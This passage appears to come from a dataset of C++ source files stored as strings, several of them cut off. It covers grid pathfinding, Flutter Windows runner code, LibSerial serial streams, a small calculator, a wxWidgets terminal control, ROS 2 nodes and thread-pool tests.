getDirectPathHigh(const Grid<uint8_t> *costField, int x0, int y0, int x1, int y1)\n{\n    uint16_t totalCost = 0;\n\n    int dx = x1 - x0;\n    int dy = y1 - y0;\n\n    int xi = 1;\n    if (dx < 0)\n    {\n        xi = -1;\n        dx = -dx;\n    }\n    int D = (2 * dx) - dy;\n    int x = x0;\n\n    for (int y = y0; y <= y1; y++)\n    {\n        uint8_t cost = (*costField)(x, y);\n        if (cost == 255) return { false, totalCost };\n        totalCost += cost;\n        if (D > 0)\n        {\n            x += xi;\n            D += (2 * (dx - dy));\n        }\n        else\n        {\n            D += 2*dx;\n        }\n    }\n\n    return { true, totalCost };\n}\n\n// Based on Bresenham's line alogorithm\nstd::tuple<bool, uint16_t> proxima::GetDirectPath(const Grid<uint8_t> *costField, const uint32_t a, const uint32_t b)\n{\n    auto [x0, y0] = costField->getCoordinate(a);\n    auto [x1, y1] = costField->getCoordinate(b);\n\n    if (std::abs(int(y1) - int(y0)) < std::abs(int(x1) - int(x0)))\n    {\n        if (x0 > x1)\n            return getDirectPathLow(costField, x1, y1, x0, y0);\n        else\n            return getDirectPathLow(costField, x0, y0, x1, y1);\n    }\n    else\n    {\n        if (y0 > y1)\n            return getDirectPathHigh(costField, x1, y1, x0, y0);\n        else\n            return getDirectPathHigh(costField, x0, y0, x1, y1);\n    }\n}\n\n// Based on algorithm described by https://web.archive.org/web/20190725152730/http://aigamedev.com/open/tutorial/clearance-based-pathfinding/\nuint32_t proxima::GetCellClearance(const Grid<uint8_t> *costField, const uint32_t x, const uint32_t y, const uint32_t maxClearance)\n{\n    for (uint32_t i = 0; ; i++)\n    {\n        uint32_t diagx = x + i;\n        uint32_t diagy = y + i;\n\n        if (diagx >= costField->width() || diagy >= costField->height()) return i - 1;\n\n        if ((*costField)(diagx, diagy) == 255) return i;\n        for (uint32_t j = 1; j < i; j++)\n        {\n            // Check vertically\n            if ((*costField)(diagx, diagy - j) == 255) return i;\n            // Check horizontally\n            if ((*costField)(diagx - j, diagy) == 255) return i;\n        }\n\n        if (maxClearance != 0 && i == maxClearance) return i;\n    }\n}\n\nvoid proxima::GenerateIntegrationField(const Grid<uint8_t> *cost, const uint32_t target, Grid<uint16_t> *result)\n{\n    result->fill(65535);\n\n    std::list<uint32_t> openList;\n    (*result)[target] = 0;\n    openList.push_back(target);\n\n    while (!openList.empty())\n    {\n        // Get next node in open list\n        uint32_t id = openList.front();\n        openList.pop_front();\n\n        auto [x, y] = cost->getCoordinate(id);\n\n        // Get neighbours\n        std::vector<uint32_t> neighbours = cost->getDirectNeighbours(x, y);\n\n        for (uint32_t i = 0; i < neighbours.size(); i++)\n        {\n            if ((*cost)[neighbours[i]] == 255)\n                continue;\n\n            uint32_t endCost = (*result)[id] + (*cost)[neighbours[i]];\n            if (endCost < (*result)[neighbours[i]])\n            {\n                openList.push_back(neighbours[i]);\n                (*result)[neighbours[i]] = (uint16_t)endCost;\n            }\n        }\n    }\n}\n\nvoid proxima::CombineIntegrationFields(const Grid<uint16_t> *a, const Grid<uint16_t> ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/******************************************************************************\n *   @file SerialStream.cc                                                    *\n *   @copyright (C) 2004 Manish Pagey                                         *\n *   crayzeewulf@users.sourceforge.net                                        *\n *                                                                            *\n *   This program is free software; you can redistribute it and/or modify     *\n *   it under the terms of the GNU Lessser General Public License as          *\n *   published by the Free Software Foundation; either version 2 of the       *\n *   License, or (at your option) any later version.                          *\n *                                                                            *\n *   This program is distributed in the hope that it will be useful,          *\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of           *\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            *\n *   GNU Lesser General Public License for more details.                      *\n *                                                                            *\n *   You should have received a copy of the GNU Lesser General Public         *\n *   License along with this program; if not, write to the                    *\n *   Free Software Foundation, Inc.,                                          *\n *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.                *\n *****************************************************************************/\n\n#include \"SerialStream.h\"\n\n#include <cassert>\n\nusing namespace LibSerial;\n\nSerialStream::SerialStream()\n    : std::iostream(0)\n    , mIOBuffer(0)\n{\n    this->flush();\n}\n\nSerialStream::SerialStream(const std::string&   fileName,\n                           const BaudRate&      baudRate,\n                           const CharacterSize& characterSize,\n                           const FlowControl&   flowControlType,\n                           const Parity&        parityType,\n                           const StopBits&      stopBits)\n    : std::iostream(0)\n    , mIOBuffer(0)\n{\n    this->Open(fileName);\n    this->SetBaudRate(baudRate);\n    this->SetCharacterSize(characterSize);\n    this->SetFlowControl(flowControlType);\n    this->SetParity(parityType);\n    this->SetStopBits(stopBits);\n    return;\n}\n\nSerialStream::~SerialStream() \n{\n    // Close the serial stream if it is open.\n    if (this->IsOpen())\n    {\n        this->Close();\n    }\n\n    return;\n}\n\nvoid\nSerialStream::Open(const std::string& fileName,\n                   const std::ios_base::openmode& openMode)\n{\n    // Create a new SerialStreamBuf if one does not exist. \n    if (!mIOBuffer)\n    {\n        mIOBuffer = new SerialStreamBuf;\n        assert(0 != mIOBuffer);\n        this->rdbuf(mIOBuffer);\n    }\n\n    // Open the serial port. \n    mIOBuffer->Open(fileName, openMode);\n    return;\n}\n\nvoid\nSerialStream::Close()\n{\n    // If a SerialStreamBuf is associated with this SerialStream\n    // we need to destroy it.\n    if (mIOBuffer)\n    {\n        delete mIOBuffer;\n        mIOBuffer = 0;\n    }\n\n    return;\n}\n\nvoid\nSerialStream::DrainWriteBuffer()\n{\n    SerialStreamBuf* my_buffer = dynamic_cast<SerialStreamBuf *>(this->rdbuf());\n\n    // Make sure that we are dealing with a SerialStreamBuf before\n    // proceeding. This check also makes sure that we have a non-NULL\n    // buffer associated with this stream.\n    if (my_buffer)\n    {\n        // Try to flush the input buffers the serial port with the correspoding\n        // function of the SerialStreamBuf class.\n        my_buffer->DrainWriteBuffer();\n    }\n    else\n    {\n        // If the dynamic_cast above failed then we either have a NULL\n        // streambuf associated with this stream or we have a buffer\n        // of class other than SerialStreamBuf. In either case, we\n        // have a problem and we should stop all I/O using this stream.\n        setstate(badbit);\n    }\n\n    return;\n}\n\nvoid\nSerialStream::FlushInputBuffer()\n{\n    SerialStreamBuf* my_buffer = dynamic_cast<SerialStreamBuf *>(this->rdbuf());\n\n    // Make sure that we are dealing with a SerialStreamBuf before\n    // proceeding. This check also makes sure that we have a non-NULL\n    // buffer associated with this stream.\n    if (my_buffer)\n    {\n        // Try to flush the input buffers the serial port with the correspoding\n        // function of the SerialStreamBuf class.\n        my_buffer->FlushInputBuffer();\n    }\n    else\n    {\n        // If the dynamic_cast above failed then we either have a NULL\n        // streambuf associated with this stream or we have a buffer\n        // of class other than SerialStreamBuf. In either case, we\n        // have a problem and we should stop all I/O using this stream.\n        setstate(badbit);\n    }\n\n    return;\n}\n\nvoid\nSerialStream::FlushOutputBuffer()\n{\n    SerialStreamBuf* my_buffer = dynamic_cast<SerialStreamBuf *>(this->rdbuf());\n\n    // Make s",
    "#include <bits/stdc++.h>\r\n#include <cmath>\r\n#include <math.h>\r\n#define long long ll\r\nusing namespace std;\r\nstring input = \"\", tmp = \"\";\r\nvector<string> list_num;\r\nvector<char> num;\r\nfloat _tmp;\r\nbool is_number(string &s)\r\n{\r\n    float v;\r\n    try\r\n    {\r\n        v = stof(s);\r\n    }\r\n    catch (const exception &e)\r\n    {\r\n        return false;\r\n    }\r\n    return true;\r\n\r\n    // isdigit(s.c_str());\r\n\r\n    // int cnt=0;\r\n    // for (char c : s) {\r\n    //     if(c=='.') cnt++;\r\n    //     if ((!isdigit(c)&&c!='.')||cnt>1) {\r\n    //         return false;\r\n    //     }\r\n    // }\r\n    // return true;\r\n}\r\nfloat calc(string &func_type, string &param)\r\n{\r\n    float val;\r\n    // func = list_num[i].substr(0, 3);\r\n    // func_param = list_num[i].substr(4, list_num[i].length() - 5);\r\n    if (func_type == \"sin\")\r\n    {\r\n        val = sin(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"cos\")\r\n    {\r\n        val = cos(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"tan\")\r\n    {\r\n        val = tan(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"num\")\r\n    {\r\n        val = stof(param);\r\n    }\r\n    else\r\n    {\r\n        cerr << \"Error:Please use cos,tan or num.\";\r\n        return 0x7fffffff;\r\n    }\r\n\r\n    return val;\r\n}\r\n\r\nfloat count()\r\n{\r\n    string func, func_param;\r\n    if (is_number(list_num[0]))\r\n    {\r\n        func = \"num\";\r\n        func_param = list_num[0];\r\n    }\r\n    else\r\n    {\r\n        func = list_num[0].substr(0, 3);\r\n        func_param = list_num[0].substr(4, list_num[0].length() - 5);\r\n    }\r\n    float func_val = calc(func, func_param);\r\n    for (int i = 1; i < list_num.size(); i++)\r\n    {\r\n        if (is_number(list_num[i]))\r\n        {\r\n            func = \"num\";\r\n            func_param = list_num[i];\r\n        }\r\n        else\r\n        {\r\n            func = list_num[i].substr(0, 3);\r\n            func_param = list_num[i].substr(4, list_num[i].length() - 5);\r\n        }\r\n        float func_val_temp = calc(func, func_param);\r\n        switch (num[i - 1])\r\n        {\r\n        case '*':\r\n            func_val *= func_val_temp;\r\n            break;\r\n        case '+':\r\n            func_val += func_val_temp;\r\n            break;\r\n        case '-':\r\n            func_val -= func_val_temp;\r\n            break;\r\n        case '/':\r\n            func_val /= func_val_temp;\r\n            break;\r\n        }\r\n    }\r\n    return func_val;\r\n}\r\nvoid split(string &data)\r\n{   \r\n    for (int i = 0; i < data.size(); i++)\r\n    {\r\n        if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/')\r\n        {\r\n            if(tmp==\"\"&&data[i]=='-'){\r\n                tmp+=data[i];\r\n                continue;\r\n            }\r\n            list_num.push_back(tmp);\r\n            num.push_back(data[i]);\r\n            tmp = \"\";\r\n        }\r\n        else if (i == data.size() - 1)\r\n        {\r\n            tmp += data[i];\r\n            list_num.push_back(tmp);\r\n            tmp = \"\";\r\n            break;\r\n        }\r\n        else\r\n        {\r\n            tmp += data[i];\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    // OK: sin(90)+sin(90)+sin(90)-sin(90)\r\n    // NG: sin(90)+num(90) Not Acceptable\r\n    // OK: sin(90)+9999999\r\n    // OK: sin(90)+(sin(90)+0.5)\r\n\r\n    cin >> input;\r\n    split(input);\r\n    float ans = count();\r\n    if (ans != 0x7fffffff)\r\n    {\r\n        cout << \"The answer is:\" << ans;\r\n    }\r\n    else\r\n    {\r\n        return -1;\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"terminalCtrl.h\"\n\n#include <unordered_set>\n\nnamespace\n{\n    std::unordered_set<int> allowedKeys {\n        wxKeyCode::WXK_LEFT,\n        wxKeyCode::WXK_RIGHT,\n        wxKeyCode::WXK_UP,\n        wxKeyCode::WXK_DOWN,\n        wxKeyCode::WXK_HOME,\n        wxKeyCode::WXK_END\n    };\n}\n\nTerminalCommandEvent::TerminalCommandEvent(wxEventType eventType, TerminalCtrl* ctrl, const wxString& command)\n    : wxCommandEvent(eventType, ctrl->GetId())\n    , command(command)\n{\n    this->SetEventObject(ctrl);\n}\n\nTerminalCommandEvent* TerminalCommandEvent::Clone() const\n{\n    return new TerminalCommandEvent(*this);\n}\n\nconst wxString& TerminalCommandEvent::getCommand()\n{\n    return this->command;\n}\n\nwxDEFINE_EVENT(terminalctrlEVT_COMMAND, TerminalCommandEvent);\nwxDEFINE_EVENT(terminalctrlEVT_POST_COMMAND, TerminalCommandEvent);\n\nTerminalCtrl::TerminalCtrl()\n    : wxTextCtrl()\n{\n    this->setup();\n}\n\nTerminalCtrl::TerminalCtrl(wxWindow* parent, wxWindowID id,\n    const wxString& value,\n    const wxPoint& pos,\n    const wxSize& size,\n    long style,\n    const wxValidator& validator,\n    const wxString& name)\n    : wxTextCtrl(parent, id, value, pos, size, createDefaultStyle(style), validator, name)\n{\n    this->setup();\n}\n\nlong TerminalCtrl::createDefaultStyle(long style)\n{\n    return style | wxTE_MULTILINE | wxTE_PROCESS_ENTER | wxTE_PROCESS_TAB | wxWS_EX_VALIDATE_RECURSIVELY;\n}\n\nvoid TerminalCtrl::setup()\n{    \n    this->insertPrompt();\n\n    Bind(wxEVT_CHAR, &TerminalCtrl::onChar, this);\n    Bind(wxEVT_KEY_DOWN, &TerminalCtrl::onChar, this);\n}\n\nvoid TerminalCtrl::setPrompt(const wxString& prompt)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->prompt = prompt;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nvoid TerminalCtrl::setPrompt(const wxString& prompt, const wxString& promptSuffix)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->prompt = prompt;\n    this->promptSuffix = promptSuffix;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nvoid TerminalCtrl::setPromptSuffix(const wxString& promptSuffix)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->promptSuffix = promptSuffix;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nwxString TerminalCtrl::getInput() const\n{\n    long start = this->getPosition(this->promptEndPosition);\n    long end = this->getPosition(this->getLastPoint());\n    return this->GetRange(start, end);\n}\n\nvoid TerminalCtrl::setCommandQueueLimit(size_t limit)\n{\n    this->commands.limit(limit);\n}\n\nvoid TerminalCtrl::nextCommand()\n{\n    if (!this->commands.empty())\n    {\n        this->setInput(this->commands.next());\n    }\n}\n\nvoid TerminalCtrl::prevCommand()\n{\n    if (!this->commands.empty())\n    {\n        this->setInput(this->commands.prev());\n    }\n}\n\nbool TerminalCtrl::toggleCommand(int key)\n{\n    if (key == wxKeyCode::WXK_UP)\n    {\n        this->nextCommand();\n        return true;\n    }\n    else if (key == wxKeyCode::WXK_DOWN)\n    {\n        this->prevCommand();\n        return true;\n    }\n\n    return false;\n}\n\nvoid TerminalCtrl::clearInput()\n{\n    long promptEnd = this->getPosition(this->promptEndPosition);\n    long end = this->getPosition(this->getLastPoint());\n    this->Remove(promptEnd, end);\n}\n\nvoid TerminalCtrl::setInput(const wxString& input)\n{\n    this->noAppendProcessing = true;\n    this->clearInput();\n    this->AppendText(input);\n    this->noAppendProcessing = false;\n    this->setInsertionAtEnd();\n}\n\nbool TerminalCtrl::insertionAtLastLine() const\n{\n    wxPoint insertionPoint = this->getPoint(this->GetInsertionPoint());\n    return insertionPoint.y == this->GetNumberOfLines() - 1;\n}\n\nbool TerminalCtrl::insertionAtInput() const\n{\n    wxPoint insertionPoint = this->getPoint(this->GetInsertionPoint());\n    return insertionPoint.y == this->promptEndPosition.y && insertionPoint.x >= this->promptEndPosition.x;\n}\n\nvoid TerminalCtrl::setInsertionAtEnd()\n{\n    long pos = this->getPosition(this->getLastPoint());\n    this->DoSetSelection(pos, pos, 0);\n}\n\nvoid TerminalCtrl::setInsertionAtPrompt()\n{\n    long pos = this->getPosition(this->promptEndPosition);\n    this->DoSetSelection(pos, pos, 0);\n}\n\nwxPoint TerminalCtrl::getPoint(long position) const\n{\n    wxPoint res;\n    long x, y;\n    this->PositionToXY(position, &x, &y);\n    res.x = x;\n    res.y = y;\n    return res;\n}\n\nwxPoint TerminalCtrl::getLastPoint() const\n{\n    return this->getPoint(this->GetValue().length());\n}\n\nlong TerminalCtrl::g",
    "#include <chrono>\n#include <memory>\n#include <functional>\n#include \"rclcpp/rclcpp.hpp\"\n#include \"geometry_msgs/msg/twist.hpp\"\n\nusing namespace std::chrono_literals;\n\nclass MinimalPublisher : public rclcpp::Node\n{\n  public:\n    MinimalPublisher()\n    : Node(\"dr_circles_node\")\n    {\n      publisher_ = this->create_publisher<geometry_msgs::msg::Twist>(\"a200_0000/cmd_vel\", 1);\n      //i = 0.0;\n      timer_ = this->create_wall_timer(0.05ms, std::bind(&MinimalPublisher::publish_message, this));\n      \n      this->declare_parameter(\"my_parameter\", double(0.0));\n      this->declare_parameter(\"ang_velocity\", double(0.0));\n      this->declare_parameter(\"run_the_code\", false);\n     // _zmienna = this->get_parameter(\"my_parameter\").as_double();\n    }\n\n  private:\n  //double _zmienna = 0.0;\n    void publish_message()\n    {\n      auto message = geometry_msgs::msg::Twist();\n      if(this->get_parameter(\"run_the_code\").as_bool() == true)\n      {\n      \t\n      if(this->get_parameter(\"my_parameter\").as_double() == 0.0 && this->get_parameter(\"ang_velocity\").as_double() == 0.0)\n      {\n      \tmessage.linear.x = 2.0;\n      \tmessage.linear.y = 2.0;\n      \tmessage.angular.z = 4;\n      \tRCLCPP_INFO(this->get_logger(), \"Sending - Linear Velocity : '%f', Angular Velocity : '%f'\", message.linear.x, message.angular.z);\n      \tpublisher_->publish(message);\n      }\n      else\n      {\n      \tmessage.linear.x = this->get_parameter(\"my_parameter\").as_double();\n      \tmessage.linear.y = this->get_parameter(\"my_parameter\").as_double();\n      \tmessage.angular.z = this->get_parameter(\"ang_velocity\").as_double();\n      \tRCLCPP_INFO(this->get_logger(), \"Sending - Linear Velocity : '%f', Angular Velocity : '%f'\", message.linear.x, message.angular.z);\n      \tpublisher_->publish(message);\n      }\n      \n      }\n    }\n    rclcpp::TimerBase::SharedPtr timer_;\n    rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr publisher_;\n    float i;\n};\n\nint main(int argc, char * argv[])\n{\n  rclcpp::init(argc, argv);\n  rclcpp::spin(std::make_shared<MinimalPublisher>());\n  rclcpp::shutdown();\n  return 0;\n}\n",
    "/**\n * M1C1 LIDAR SYSTEM\n * M1C1 LIDAR ROS 2 Client\n * \n*/\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/laser_scan.hpp\"\n#include <math.h>\n\n#define RAD2DEG(x) ((x)*180./M_PI)\n\nstatic void scanCb(sensor_msgs::msg::LaserScan::SharedPtr scan) {\n  int count = scan->scan_time / scan->time_increment;\n  printf(\"[M1C1 LIDAR INFO]: I heard a laser scan %s[%d]:\\n\", scan->header.frame_id.c_str(), count);\n  printf(\"[M1C1 LIDAR INFO]: angle_range : [%f, %f]\\n\", RAD2DEG(scan->angle_min),\n         RAD2DEG(scan->angle_max));\n\n  for (int i = 0; i < count; i++) {\n    float degree = RAD2DEG(scan->angle_min + scan->angle_increment * i);\n    printf(\"[M1C1 LIDAR INFO]: angle-distance : [%f, %f]\\n\", degree, scan->ranges[i]);\n  }\n}\n\nint main(int argc, char **argv) {\n  rclcpp::init(argc, argv);\n\n  auto node = rclcpp::Node::make_shared(\"lidar_client\");\n\n  auto lidar_info_sub = node->create_subscription<sensor_msgs::msg::LaserScan>(\n                        \"scan\", rclcpp::SensorDataQoS(), scanCb);\n\n  rclcpp::spin(node);\n\n  rclcpp::shutdown();\n\n\n  return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream>\n#include\"threadpool.h\"\n#include<thread>\n#include<chrono>\n#include<memory>\n#include\"threadpool.h\"\n\nusing ULong = unsigned long long;\n\n/*\n\u6709\u4e9b\u573a\u666f\u9700\u8981\u83b7\u53d6\u7ebf\u7a0b\u4efb\u52a1\u7684\u8fd4\u56de\u503c\n\u4e3e\u4f8b\uff1a\n1+2+....+100\n101+102+....+200\n201+202+....+300\nmain thread:\u7ed9\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u5206\u914d\u8ba1\u7b97\u533a\u95f4\uff0c\u5e76\u7b49\u5f85\u4ed6\u4eec\u8ba1\u7b97\u8fd4\u56de\u7ed3\u679c\uff0c\u7136\u540e\u5408\u5e76\u6700\u7ec8\u7ed3\u679c\n\n*/\n\nclass MyTask :public Task {\npublic:\n\tMyTask(ULong begin, ULong end)\n\t\t: begin_(begin)\n\t\t, end_(end)\n\t{}\n\t\n\tAny run() \n\t{\n\t\tstd::cout <<\"begin!\" << \" \" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\tULong sum = 0;\n\t\tfor (ULong i = begin_; i <= end_; i++) {\n\t\t\tsum += i;\n\t\t}\n\t\tstd::cout <<\"end!\" << \" \" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\treturn sum;\n\t}\nprivate:\n\tULong begin_;\n\tULong end_;\n};\n\nclass Tak: public Task {\npublic:\n\tAny run() {\n\t\tstd::cout << \"begin!\" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\tstd::this_thread::sleep_for(std::chrono::seconds(1));\n\t\tstd::cout << \"end!\" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\treturn 0;\n\t}\n\n};\n\n\nint main() {\n\t\n/*Test6\n\t\u5728\u4efb\u52a1\u63d0\u4ea4\u4e4b\u540e\u5c31\u51fa\u4f5c\u7528\u57df\u4e86\uff0c\u5f00\u59cb\u6267\u884c\u6790\u6784\u51fd\u6570\uff0c\u90a3\u4e48\u6ca1\u6267\u884c\u5b8c\u7684\u4efb\u52a1\u662f\u76f4\u63a5\u7ed3\u675f\u8fd8\u662f\u7b49\u6267\u884c\u5b8c\uff1f\n\t\u4fee\u6539\u4e3a\u6240\u6709\u4efb\u52a1\u6267\u884c\u5b8c\u624d\u80fd\u8fdb\u884c\u6790\u6784\n*/\n{\n\tThreadPool pool;\n\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\tpool.setMode(PoolMode::MODE_CACHED);\n\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\tpool.start(4);\n\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\t/*ULong sum1 = res1.get().cast_<ULong>();\n\tstd::cout << sum1 << std::endl;*/\n}\n\n\n\n\t\n\n\t/*//Test5\n\t\u6b7b\u9501\u95ee\u9898\n\t* \u76ee\u524d\u8003\u8651\u5230\u4e86\u6b63\u5728\u6267\u884c\u548c\u6b63\u5728\u7b49\u5f85\u4e24\u79cd\u60c5\u5f62\u4e0b\u7684\u7ebf\u7a0b\u6790\u6784\uff0c\u672a\u8003\u8651\u5230\u5df2\u7ecf\u8fdb\u5165\u5faa\u73af\u7b49\u5f85\u62ff\u9501\u62a2\u4efb\u52a1\u7684\u7ebf\u7a0b\n\t* \u5728\u8fdb\u884c\u6790\u6784\u65f6\uff0c\u6790\u6784\u51fd\u6570\u548c\u7ebf\u7a0b\u6c60\u51fd\u6570\u540c\u65f6\u62a2\u5360\u9501\n\t* 1.pool\u7ebf\u7a0b\u5148\u83b7\u53d6\u5230-->\u963b\u585e-->\u8fdb\u5165\u7b49\u5f85\u72b6\u6001\uff0c\u6b64\u65f6\u91ca\u653e\u6389\u9501-->notEmpty()\u4e00\u76f4\u7b49\u5f85,\u8fdb\u5165\u6b7b\u9501\n\t* 2.\u7ebf\u7a0b\u51fd\u6570\u5148\u83b7\u53d6\u5230\uff0c\u6b64\u65f6\u4efb\u52a1\u961f\u5217\u4e3a\u7a7a\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5219notEmpty()\u4e00\u76f4\u7b49\u5f85\uff0c\u8fdb\u5165\u6b7b\u9501\n\t\n\t{\n\t\tThreadPool pool;\n\t\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\t\tpool.setMode(PoolMode::MODE_CACHED);\n\t\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\t\tpool.start(4);\n\t\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\t\tULong sum1 = res1.get().cast_<ULong>();\n\t\tstd::cout << sum1 << std::endl;\n\t}\n\tsystem(\"pause\");\n\n\t*/\n\t/*\n\tTest4\n\t*\n\tThreadPool \u5bf9\u8c61\u6790\u6784\u4e4b\u540e\uff0c\u600e\u4e48\u628a\u7ebf\u7a0b\u6c60\u76f8\u5173\u7684\u7ebf\u7a0b\u8d44\u6e90\u5168\u90e8\u56de\u6536\uff1f\n\t\n\t{\n\t\tThreadPool pool;\n\t\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\t\tpool.setMode(PoolMode::MODE_CACHED);\n\t\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\t\tpool.start(4);\n\n\t\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\t\tResult res2 = pool.submitTask(std::make_shared<MyTask>(100000001, 200000000));\n\t\tResult res3 = pool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tULong sum1 = res1.get().cast_<ULong>();\n\t\tULong sum2 = res2.get().cast_<ULong>();\n\t\tULong sum3 = res3.get().cast_<ULong>();\n\t\tstd::cout << (sum1 + sum2 + sum3) << std::endl;\n\t}\n\tsystem(\"pause\");\n\t*/\n\n\n\t/*\n\tTest3\n\tThreadPool pool;\n\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\tpool.setMode(PoolMode::MODE_CACHED);\n\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\tpool.start(4);\n\n\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\tResult res2 = pool.submitTask(std::make_shared<MyTask>(100000001, 200000000));\n\tResult res3 = pool.submitTask(std::make_shared<MyTask>(200000001, 